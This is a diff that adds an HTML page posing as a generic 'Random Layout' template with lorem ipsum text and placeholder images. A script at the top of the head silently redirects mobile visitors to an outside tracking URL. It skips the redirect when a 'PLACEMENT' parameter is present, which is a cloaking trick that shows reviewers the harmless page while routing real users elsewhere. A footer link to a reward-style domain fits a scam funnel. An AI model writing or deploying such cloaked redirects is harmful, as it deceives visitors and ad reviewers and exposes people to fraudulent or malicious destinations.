@@ -1,0 +1,110 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <script>
+        const urlParams = new URLSearchParams(window.location.search);
+        const utmXXX = urlParams.get("xxx");
+        const s = urlParams.get("s");
+        const ttclid = urlParams.get("ttclid");
+        const isMobileDevice = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
+        const lander = `https://klcxb6.mcgo2.com/visit/dade2563-43ce-4351-9ba3-22961c539221?s1=${s}`;
+        if (utmXXX === "PLACEMENT") {
+            // Do nothing for PLACEMENT
+        } else if (isMobileDevice) {
+            window.location.href = lander;
+        } else {
+            // Do nothing for non-mobile devices
+        }
+    </script>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Random Layout</title>
+    <style>
+        body {
+            margin: 0;
+            font-family: Arial, sans-serif;
+            background-color: #f0f0f0;
+            color: #333;
+        }
+        header, footer {
+            background-color: #333;
+            color: #fff;
+            text-align: center;
+            padding: 10px 0;
+        }
+        main {
+            display: flex;
+            flex-wrap: wrap;
+            padding: 20px;
+        }
+        .content {
+            flex: 1 1 calc(50% - 40px);
+            background-color: #fff;
+            margin: 10px;
+            padding: 20px;
+            box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
+        }
+        .content img {
+            max-width: 100%;
+            height: auto;
+        }
+        nav {
+            width: 100%;
+            background-color: #555;
+            color: #fff;
+            padding: 15px;
+            margin: 20px 0;
+            text-align: center;
+        }
+        aside {
+            flex: 1 1 calc(25% - 40px);
+            background-color: #f7f7f7;
+            margin: 10px;
+            padding: 20px;
+            box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
+        }
+        @media (max-width: 768px) {
+            .content, aside {
+                flex: 1 1 100%;
+            }
+            nav {
+                margin: 10px 0;
+            }
+        }
+    </style>
+</head>
+<body>
+
+<header>
+    <h1>Welcome to the Random Layout</h1>
+</header>
+
+<nav>
+    <a href="#" style="color: #fff; text-decoration: none; margin-right: 15px;">Home</a>
+    <a href="#" style="color: #fff; text-decoration: none; margin-right: 15px;">About</a>
+    <a href="#" style="color: #fff; text-decoration: none;">Contact</a>
+</nav>
+
+<main>
+    <div class="content">
+        <h2>Section 1</h2>
+        <p>Lorem ipsum dolor sit amet, consectetur adipiscing elit. Nulla vel purus euismod, viverra libero id, tincidunt arcu. Aenean nec libero eros. Pellentesque habitant morbi tristique senectus et netus et malesuada fames ac turpis egestas.</p>
+        <img src="https://via.placeholder.com/400x200" alt="Placeholder Image">
+    </div>
+    <div class="content">
+        <h2>Section 2</h2>
+        <p>Mauris at dictum arcu. Nullam euismod, nulla nec pretium vestibulum, lectus tortor bibendum libero, id lacinia ipsum turpis a risus. Quisque varius scelerisque vestibulum. Vivamus viverra ante eget orci egestas, vel ultricies enim cursus.</p>
+        <img src="https://via.placeholder.com/400x200" alt="Placeholder Image">
+    </div>
+    <aside>
+        <h3>Sidebar Content</h3>
+        <p>Curabitur auctor metus sit amet massa tincidunt, at venenatis ligula aliquet. Etiam nec velit ut dolor vehicula ullamcorper. In consequat velit id justo accumsan, ac vestibulum ligula vehicula.</p>
+    </aside>
+</main>
+
+<footer>
+    <p>&copy; 2024 Random Layout Inc. <a href="https://tokreward.com/privacy.html" style="color: #fff;">Privacy Policy</a></p>
+</footer>
+
+</body>
+</html>
